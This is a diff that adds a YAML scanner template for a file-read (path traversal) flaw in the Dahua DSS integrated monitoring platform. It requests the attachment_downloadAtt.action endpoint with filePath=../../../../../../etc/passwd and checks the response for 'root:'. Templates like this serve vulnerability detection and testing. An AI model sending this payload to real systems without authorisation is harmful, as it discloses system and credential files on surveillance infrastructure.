@@ -1,0 +1,11 @@
+name: 大华DSS综合监控管理平台-attachment_downloadAtt
+description: >-
+  文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /portal/attachment_downloadAtt.action?filePath=../../../../../../etc/passwd
+    expression:
+      status: 200
+      body_all: ["root:"]
